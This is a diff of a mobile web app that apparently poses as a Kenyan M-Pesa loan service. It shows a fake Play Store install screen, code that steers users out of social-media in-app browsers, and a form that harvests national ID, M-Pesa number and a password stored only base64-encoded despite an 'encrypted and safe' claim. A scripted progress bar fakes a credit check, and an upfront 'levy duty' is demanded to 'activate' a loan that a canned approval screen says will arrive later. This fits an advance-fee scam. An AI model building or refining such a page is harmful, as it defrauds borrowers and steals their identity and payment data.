+                    <div><input type="number" id="in-id" placeholder="National ID (7-8 digits)"></div>
+                    <div><input type="tel" id="in-mpesa" placeholder="M-Pesa (0712345678)"></div>
+                    <div><input type="password" id="in-pass" placeholder="Password (min 4 chars)"></div>
+                    <button onclick="submitLogin()" class="native-btn" style="margin-top: 8px;">Create Account</button>
+                </div>
+                <p class="text-center text-xs text-slate-400 mt-6 font-medium">🔒 Your data is encrypted and safe</p>
             </div>
-            <button onclick="location.reload()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg">Done</button>
-        </div>
-        <div id="failed-anim" class="hide flex flex-col items-center">
-            <div class="w-24 h-24 bg-red-100 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl">✕</div>
-            <h2 class="text-2xl font-extrabold text-slate-900">Payment Not Completed</h2>
-            <p class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4 leading-relaxed">The M-Pesa request was cancelled or failed.</p>
-            <button onclick="retryPayment()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg">Try Again</button>
-        </div>
-        <div id="pending-anim" class="hide flex flex-col items-center">
-            <div class="w-24 h-24 bg-amber-100 text-amber-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl">?</div>
-            <h2 class="text-2xl font-extrabold text-slate-900">Still Confirming</h2>
-            <p class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4 leading-relaxed">We haven't received confirmation from M-Pesa yet. Tap below to check again.</p>
-            <button onclick="checkStatusManual()" id="btn-check-status" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg mb-3 flex justify-center"><span>Check Status</span></button>
-            <button onclick="retryPayment()" class="w-full text-brandBlue font-bold py-3 text-sm">Back to Payment</button>
         </div>
     </div>
-</div>
 
+    <!-- CHECKING (15 SECONDS) -->
+    <div id="screen-checking" class="screen gradient-bg items-center justify-center" style="padding: 24px;">
+        <div class="pulse-ring"><img src="icon.png" class="w-20 h-20 rounded-2xl object-cover z-10 relative"></div>
+        <h2 class="text-white text-2xl font-bold text-center mb-2">Setting up your account</h2>
+        <p id="check-status" class="text-blue-200 text-sm mb-10 font-medium text-center">Verifying your identity...</p>
+        <div class="w-full max-w-xs bg-white/10 rounded-full h-2 mb-4 overflow-hidden">
+            <div id="check-bar" class="bg-brandYellow h-2 rounded-full transition-all duration-100" style="width: 0%"></div>
+        </div>
+        <p id="check-percent" class="text-white font-bold text-lg">0%</p>
+        <p class="text-blue-200/60 text-xs mt-8 text-center">This usually takes a few seconds</p>
+    </div>
+
+    <!-- LOAN SELECTION -->
+    <div id="screen-select" class="screen app-shell" style="padding: 0 0 32px 0;">
+        <div class="app-bar">
+            <div>
+                <h1 class="app-bar-title">Hello, <span id="greeting-name">there</span></h1>
+                <p class="text-xs text-slate-500 mt-0.5">Choose your loan amount</p>
+            </div>
+        </div>
+        <div style="padding: 0 20px;">
+            <div class="section-label">Select amount</div>
+            <div class="grid grid-cols-3 gap-2.5 mb-6" id="amount-grid"></div>
+
+            <div class="section-label">Repayment term</div>
+            <div class="flex gap-2.5 mb-6">
+                <button onclick="setTerm(30, this)" class="term-btn selected flex-1">30 days</button>
+                <button onclick="setTerm(60, this)" class="term-btn flex-1">60 days</button>
+                <button onclick="setTerm(90, this)" class="term-btn flex-1">90 days</button>
+            </div>
+
+            <div class="native-card" style="padding: 20px; margin-bottom: 24px;">
+                <div class="row-item"><span class="row-label">You receive</span><span id="sum-receive" style="font-size: 22px; font-weight: 800; color: #1E40AF;">Ksh 1,000</span></div>
+                <div class="row-item"><span id="sum-interest-label" class="row-label">Interest (10%)</span><span id="sum-interest" class="row-value">Ksh 100</span></div>
+                <div class="row-item"><span class="row-label">Total repayment</span><span id="sum-total" class="row-value" style="color: #059669; font-size: 17px;">Ksh 1,100</span></div>
+                <div class="row-item"><span class="row-label">Due date</span><span id="sum-due" class="row-value">--</span></div>
+                <div class="row-item"><span class="row-label">Levy Duty (one-time)</span><span id="sum-levy" style="font-weight: 800; color: #F59E0B; font-size: 17px;">Ksh 1</span></div>
+            </div>
+            <button onclick="goToPayment()" class="native-btn">Continue</button>
+        </div>
+    </div>
+
+    <!-- PAYMENT (SIMPLIFIED) -->
+    <div id="screen-payment" class="screen app-shell" style="padding: 0 0 32px 0;">
+        <div class="app-bar">
+            <button onclick="showScreen('screen-select')" class="app-bar-back">
+                <svg class="w-5 h-5 text-slate-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"></path></svg>
+            </button>
+            <h1 class="app-bar-title">Levy Duty</h1>
+        </div>
+        <div style="padding: 0 20px;">
+            <div class="native-card text-center" style="padding: 32px 20px; margin-bottom: 20px;">
+                <p class="section-label" style="margin-bottom: 8px;">Amount to pay</p>
+                <p style="font-size: 44px; font-weight: 800; color: #0F172A; letter-spacing: -0.03em;" id="pay-levy">Ksh 1</p>
+                <p style="font-size: 13px; color: #64748B; margin-top: 8px;">Government levy duty</p>
+            </div>
+            <div class="native-card" style="padding: 20px; margin-bottom: 20px;">
+                <label class="section-label" style="display: block;">M-Pesa number</label>
+                <input type="tel" id="pay-mpesa" placeholder="0712345678">
+                <p style="font-size: 12px; color: #94A3B8; margin-top: 10px;">Your loan will be sent to this number</p>
+            </div>
+            <div class="info-banner" style="margin-bottom: 24px;">
+                <svg class="w-5 h-5 flex-shrink-0 text-brandBlue" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                <p style="font-size: 13px; line-height: 1.5; color: #1E40AF; font-weight: 500;">Pay the small levy duty to activate your loan. Funds will be released immediately after confirmation.</p>
+            </div>
+            <button onclick="processPayment()" id="btn-pay" class="native-btn">Pay Ksh 1 Levy Duty</button>
+        </div>
+    </div>
+
+    <!-- SUCCESS/VERIFY/PENDING -->
+    <div id="screen-success" class="screen app-shell" style="padding: 0 20px 32px;">
+        <div class="max-w-sm mx-auto w-full text-center" style="padding-top: 60px;">
+            <div id="verify-anim" class="flex flex-col items-center">
+                <div style="width: 100px; height: 100px; border: 5px solid #E2E8F0; border-top-color: #1E40AF; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 28px;"></div>
+                <h2 style="font-size: 22px; font-weight: 800; color: #0F172A;">Verifying payment</h2>
+                <p id="verify-subtitle" style="font-size: 14px; color: #64748B; margin-top: 8px; line-height: 1.5; padding: 0 8px;">Please wait while we confirm with M-Pesa...</p>
+                <p id="verify-time" style="color: #F59E0B; font-weight: 800; margin-top: 20px; font-size: 18px; background: #FEF3C7; padding: 6px 18px; border-radius: 999px; display: inline-block;">0s</p>
+            </div>
+
+            <!-- SUCCESS (NO DONE BUTTON) -->
+            <div id="success-anim" class="hide flex flex-col items-center">
+                <div class="check-circle">
+                    <svg class="w-12 h-12 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+                </div>
+                <h2 style="font-size: 24px; font-weight: 800; color: #0F172A; margin-bottom: 8px;">Loan Approved!</h2>
+                <p style="font-size: 14px; color: #64748B; padding: 0 12px; line-height: 1.5;">Your loan request has been successfully processed.</p>
+                <div class="native-card w-full" style="margin-top: 28px; margin-bottom: 20px; padding: 20px;">
+                    <div class="row-item"><span class="row-label">Loan Amount</span><span id="suc-loan" class="row-value" style="font-size: 17px;">Ksh 1,000</span></div>
+                    <div class="row-item"><span class="row-label">Total Repayment</span><span id="suc-total" class="row-value">Ksh 1,100</span></div>
+                    <div class="row-item"><span class="row-label">Due Date</span><span id="suc-due" class="row-value">--</span></div>
+                    <div class="row-item"><span class="row-label">M-Pesa</span><span id="suc-mpesa" class="row-value" style="color: #1E40AF;"></span></div>
+                </div>
+                <div class="info-banner w-full" style="margin-bottom: 20px;">
+                    <svg class="w-5 h-5 flex-shrink-0 text-brandBlue" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    <p style="font-size: 13px; line-height: 1.55; color: #1E40AF; font-weight: 500; text-align: left;">Your funds will be disbursed to your M-Pesa within the next <strong>24 hours</strong>.</p>
+                </div>
+                <p style="font-size: 12px; color: #94A3B8; font-weight: 500;">You may now close the app</p>
+            </div>
+
+            <!-- FAILED -->
+            <div id="failed-anim" class="hide flex flex-col items-center">
+                <div style="width: 96px; height: 96px; background: #FEE2E2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;">
+                    <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M6 18L18 6M6 6l12 12"></path></svg>
+                </div>
+                <h2 style="font-size: 22px; font-weight: 800; color: #0F172A;">Payment Not Completed</h2>
+                <p id="failed-reason" style="font-size: 14px; color: #64748B; margin-top: 8px; margin-bottom: 32px; padding: 0 16px; line-height: 1.5;">The M-Pesa request was cancelled or failed.</p>
+                <button onclick="retryPayment()" class="native-btn">Try Again</button>
+            </div>
+
+            <!-- PENDING -->
+            <div id="pending-anim" class="hide flex flex-col items-center">
+                <div style="width: 96px; height: 96px; background: #FEF3C7; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; font-size: 48px; color: #F59E0B; font-weight: 800;">?</div>
+                <h2 style="font-size: 22px; font-weight: 800; color: #0F172A;">Still Confirming</h2>
+                <p style="font-size: 14px; color: #64748B; margin-top: 8px; margin-bottom: 32px; padding: 0 16px; line-height: 1.5;">We haven't received confirmation from M-Pesa yet. Tap below to check again.</p>
+                <button onclick="checkStatusManual()" id="btn-check-status" class="native-btn" style="margin-bottom: 12px; display: flex; justify-content: center;"><span>Check Status</span></button>
+                <button onclick="retryPayment()" style="width: 100%; color: #1E40AF; font-weight: 700; padding: 12px; font-size: 14px; background: none; border: none; cursor: pointer;">Back to Payment</button>
+            </div>
+        </div>
+    </div>
 </div>
 
 <script>
@@ -367,10 +412,48 @@ async function readJsonSafe(r){ try{ const x = await r.text(); return x ? JSON.p
 function stopPolling(){ if(pollTimer){ clearTimeout(pollTimer); pollTimer = null; } isPolling = false; }
 function resetPayButton(){ isProcessingPayment = false; const b = document.getElementById('btn-pay'); if(b){ b.disabled = false; b.innerText = `Pay ${format(state.levy)} Levy Duty`; } }
 
-/* PLAY STORE */
+/* =============== BROWSER DETECTION =============== */
+const _ua = navigator.userAgent || '';
+const _isAndroid = /Android/i.test(_ua);
+const _isIOS = /iPhone|iPad|iPod/i.test(_ua);
+const _isChromeBrowser = /Chrome\/\d+/i.test(_ua) && !/Edg|OPR|SamsungBrowser|Firefox/i.test(_ua);
+const _isInApp = detectInAppBrowser(_ua);
+const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
+const _cameFromIntent = new URLSearchParams(location.search).get('_pwa') === '1';
+const _wasInstalled = localStorage.getItem('pwa_installed') === '1';
+
+function detectInAppBrowser(ua) {
+    if (/FBAN|FBAV|FB4A|FB_IAB|Instagram|Twitter|musical_ly|BytedanceWebview|TikTok|Line|Snapchat|LinkedIn|Pinterest|WhatsApp|Telegram|GSA/i.test(ua)) return true;
+    if (/; wv\)/i.test(ua)) return true;
+    if (/iPhone|iPad/i.test(ua) && !/Safari/i.test(ua) && !/CriOS/i.test(ua) && !/FxiOS/i.test(ua)) return true;
+    return false;
+}
+
+function openInChrome() {
+    if (_isAndroid) {
+        window.location.href = `intent://${window.location.host}${window.location.pathname}#Intent;scheme=https;package=com.android.chrome;end`;
+        return;
+    }
+    if (_isIOS) {
+        window.location.href = window.location.href.replace(/^https?:\/\//, 'x-safari-https://');
+        return;
+    }
+    window.location.reload();
+}
+
+function copyLinkAndShowHelp() {
+    navigator.clipboard.writeText(window.location.href).then(() => {
+        alert('✅ Link copied!\n\nPaste it into Chrome\'s address bar to continue.');
+    }).catch(() => {
+        alert('Please copy the URL from the address bar and paste it into Chrome.');
+    });
+}
+
+/* =============== PLAY STORE =============== */
 const playStoreGate = document.getElementById('play-store-gate');
 const appContent = document.getElementById('app-content');
 const splashScreen = document.getElementById('splash-screen');
+const browserWarning = document.getElementById('browser-warning');
 let deferredPrompt, downloadInterval;
 
 window.addEventListener('beforeinstallprompt', (e)=>{ e.preventDefault(); deferredPrompt = e; });
@@ -395,7 +478,10 @@ function showInstalledState(){
     document.getElementById('post-install-content').classList.remove('hide');
     document.getElementById('pre-install-content').classList.remove('hide');
 }
-function mockUninstall(){ showInstallState(); }
+function mockUninstall(){
+    localStorage.removeItem('pwa_installed');
+    showInstallState();
+}
 function setRating(r){
     document.querySelectorAll('.rate-star').forEach((s,i)=>{
         if(i<r){ s.classList.remove('text-gray-300'); s.classList.add('text-brandYellow'); s.setAttribute('fill','currentColor'); }
@@ -405,14 +491,30 @@ function setRating(r){
 }
 
 document.getElementById('btn-store-install').addEventListener('click', async ()=>{
-    if(deferredPrompt){
+    if (deferredPrompt) {
         deferredPrompt.prompt();
         const { outcome } = await deferredPrompt.userChoice;
         deferredPrompt = null;
-        if(outcome === 'accepted') startFakeDownload();
-    } else {
-        startFakeDownload();
+        if (outcome === 'accepted') {
+            localStorage.setItem('pwa_installed', '1');
+            startFakeDownload();
+        } else {
+            showToast("Installation cancelled");
+        }
+        return;
     }
+    let alreadyInstalled = localStorage.getItem('pwa_installed') === '1';
+    if (!alreadyInstalled && 'getInstalledRelatedApps' in navigator) {
+        try { const apps = await navigator.getInstalledRelatedApps(); alreadyInstalled = apps.length > 0; } catch(e) {}
+    }
+    if (alreadyInstalled) {
+        localStorage.setItem('pwa_installed', '1');
+        showInstalledState();
+        showToast("App already installed");
+        return;
+    }
+    showToast("Installation unavailable. Reload and try again.");
+    setTimeout(()=>{ alert('⚠️ Installation is not available right now.\n\nPlease:\n1. Make sure you\'re in Google Chrome\n2. Reload this page\n3. Tap Install again'); }, 300);
 });
 
 function startFakeDownload(){
@@ -440,18 +542,74 @@ function startFakeDownload(){
 
 document.getElementById('btn-open-app').addEventListener('click', ()=>{
     playStoreGate.classList.add('hide');
-    splashScreen.classList.remove('hide');
-    splashScreen.classList.add('splash-anim');
-    setTimeout(()=>{ splashScreen.classList.add('hide'); appContent.classList.remove('hide'); }, 1800);
+    if (_isAndroid) {
+        const intentUrl = `intent://${window.location.host}${window.location.pathname}?_pwa=1#Intent;scheme=https;action=android.intent.action.VIEW;end`;
+        window.location.href = intentUrl;
+        setTimeout(showAppInline, 800);
+    } else {
+        showAppInline();
+    }
 });
 
-const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
-if(isStandalone){ playStoreGate.classList.add('hide'); appContent.classList.remove('hide'); }
-else { playStoreGate.classList.remove('hide'); showInstallState(); }
+function showAppInline(){
+    splashScreen.classList.remove('hide');
+    splashScreen.classList.add('splash-anim');
+    setTimeout(()=>{
+        splashScreen.classList.add('hide');
+        appContent.classList.remove('hide');
+        bootApp();
+    }, 1800);
+}
+
+/* =============== BOOT LOGIC =============== */
+function bootApp(){
+    if (_cameFromIntent) history.replaceState({}, '', window.location.pathname);
+    const saved = localStorage.getItem('zc_user');
+    if(saved){
+        try {
+            const u = JSON.parse(saved);
+            if(u.name && u.mpesa){
+                state.name = u.name;
+                state.id = u.id || '';
+                state.mpesa = u.mpesa;
+                buildLoanScreen();
+                return;
+            }
+        } catch(e){ localStorage.removeItem('zc_user'); }
+    }
+    showScreen('screen-login');
+}
+
+if (isStandalone) {
+    playStoreGate.classList.add('hide');
+    browserWarning.classList.add('hide');
+    appContent.classList.remove('hide');
+    bootApp();
+} else if (_cameFromIntent) {
+    playStoreGate.classList.add('hide');
+    browserWarning.classList.add('hide');
+    showAppInline();
+} else if (_isInApp || (_isAndroid && !_isChromeBrowser)) {
+    playStoreGate.classList.add('hide');
+    browserWarning.classList.remove('hide');
+} else if (_isIOS) {
+    playStoreGate.classList.add('hide');
+    browserWarning.classList.add('hide');
+    appContent.classList.remove('hide');
+    bootApp();
+} else if (_wasInstalled) {
+    playStoreGate.classList.add('hide');
+    browserWarning.classList.add('hide');
+    appContent.classList.remove('hide');
+    bootApp();
+} else {
+    playStoreGate.classList.remove('hide');
+    showInstallState();
+}
 
 if('serviceWorker' in navigator){ window.addEventListener('load', ()=>{ navigator.serviceWorker.register('sw.js').catch(()=>{}); }); }
 
-/* APP LOGIC */
+/* =============== LOGIN (15 SEC) =============== */
 function submitLogin(){
     const name = document.getElementById('in-name').value.trim();
     const id = document.getElementById('in-id').value.trim();
@@ -461,29 +619,49 @@ function submitLogin(){
     if(!/^\d{7,8}$/.test(id)) return showToast("National ID must be 7-8 digits.");
     if(!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) return showToast("Enter a valid M-Pesa number.");
     if(pass.length < 4) return showToast("Password must be at least 4 characters.");
+
     state.name = name; state.id = id; state.mpesa = mpesa;
+    localStorage.setItem('zc_user', JSON.stringify({ name, id, mpesa }));
+
     fetch(`${SUPABASE_URL}/rest/v1/users`, {
         method:'POST',
         headers:{ 'apikey':SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}`, 'Content-Type':'application/json' },
         body: JSON.stringify({ full_name:name, national_id:id, mpesa_number:mpesa, password_hash:"web_"+btoa(pass) })
     }).catch(()=>{});
+
     showScreen('screen-checking');
     let p = 0;
+    const duration = 15000;
+    const steps = duration / 100;
+    const increment = 100 / steps;
+
     const i = setInterval(()=>{
-        p += 20;
+        p += increment;
+        if(p > 100) p = 100;
         document.getElementById('check-bar').style.width = p + "%";
-        document.getElementById('check-percent').innerText = p + "%";
-        document.getElementById('check-status').innerText = p < 50 ? "Analyzing profile..." : "Calculating limit...";
+        document.getElementById('check-percent').innerText = Math.floor(p) + "%";
+
+        let msg = "Verifying your identity...";
+        if(p >= 15) msg = "Reviewing your profile...";
+        if(p >= 40) msg = "Analyzing M-Pesa history...";
+        if(p >= 65) msg = "Calculating your loan limit...";
+        if(p >= 90) msg = "Almost ready...";
+        document.getElementById('check-status').innerText = msg;
+
         if(p >= 100){ clearInterval(i); buildLoanScreen(); }
-    }, 150);
+    }, 100);
 }
 
+/* =============== LOAN SELECTION =============== */
 function buildLoanScreen(){
+    const first = state.name.split(' ')[0];
+    document.getElementById('greeting-name').innerText = first || 'there';
+
     const grid = document.getElementById('amount-grid');
     grid.innerHTML = '';
     amounts.forEach(a=>{
         const b = document.createElement('button');
-        b.className = `amount-btn py-3.5 text-sm ${a === state.loan ? 'selected' : ''}`;
+        b.className = `amount-btn ${a === state.loan ? 'selected' : ''}`;
         b.innerText = a.toLocaleString();
         b.onclick = ()=>{ document.querySelectorAll('.amount-btn').forEach(x=>x.classList.remove('selected')); b.classList.add('selected'); state.loan = a; updateSummary(); };
         grid.appendChild(b);
@@ -507,12 +685,9 @@ function updateSummary(){
     document.getElementById('sum-levy').innerText = format(state.levy);
 }
 
+/* =============== PAYMENT =============== */
 function goToPayment(){
-    document.getElementById('pay-loan').innerText = format(state.loan);
-    document.getElementById('pay-interest').innerText = format(state.interest);
-    document.getElementById('pay-total').innerText = format(state.total);
     document.getElementById('pay-levy').innerText = format(state.levy);
-    document.getElementById('pay-name').innerText = state.name;
     document.getElementById('pay-mpesa').value = state.mpesa;
     resetPayButton();
     showScreen('screen-payment');
@@ -525,6 +700,7 @@ async function processPayment(){
     isProcessingPayment = true;
     state.mpesa = mpesa;
     document.getElementById('btn-pay').disabled = true;
+
     document.getElementById('verify-anim').classList.remove('hide');
     document.getElementById('success-anim').classList.add('hide');
     document.getElementById('failed-anim').classList.add('hide');
@@ -547,7 +723,6 @@ async function processPayment(){
         if(!txnId) throw new Error("No transaction ID in response.");
         currentTxnId = txnId;
 
-        /* ===== CRITICAL: INSERT WITH LOUD ERROR ===== */
         const insertRes = await fetchWithTimeout(`${SUPABASE_URL}/rest/v1/loans`, {
             method:'POST',
             headers:{ 'apikey':SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}`, 'Content-Type':'application/json', 'Prefer':'return=minimal' },
@@ -556,7 +731,7 @@ async function processPayment(){
 
         if(!insertRes.ok){
             const errText = await insertRes.text();
-            alert('❌ DATABASE REJECTED THE LOAN\n\n' + errText.substring(0,300) + '\n\n⚠️ FIX REQUIRED:\nGo to Supabase → SQL Editor → run:\n\nALTER TABLE loans DISABLE ROW LEVEL SECURITY;');
+            alert('❌ DATABASE REJECTED THE LOAN\n\n' + errText.substring(0,300));
             resetPayButton();
             showScreen('screen-payment');
             return;
